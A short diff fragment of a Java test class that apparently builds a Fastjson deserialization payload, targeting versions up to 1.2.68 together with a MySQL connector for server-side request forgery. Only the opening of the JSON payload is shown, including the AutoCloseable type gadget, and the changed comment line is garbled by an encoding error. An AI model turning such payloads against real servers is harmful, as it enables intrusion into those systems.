@@ -3,7 +3,7 @@ package test;
 import com.alibaba.fastjson.JSON;
 
 public class Fastjson12_mysql_1 {
-  	//<=1.2.68 and mysql 5.0.2-5.1.5 ½öSSRF
+  	//<=1.2.68 and mysql 5.0.2-5.1.5 ä»…SSRF
     public static void main(String[] args) throws Exception{
         String payload = "{\r\n"
         		+ "	\"@type\": \"java.lang.AutoCloseable\",\r\n"
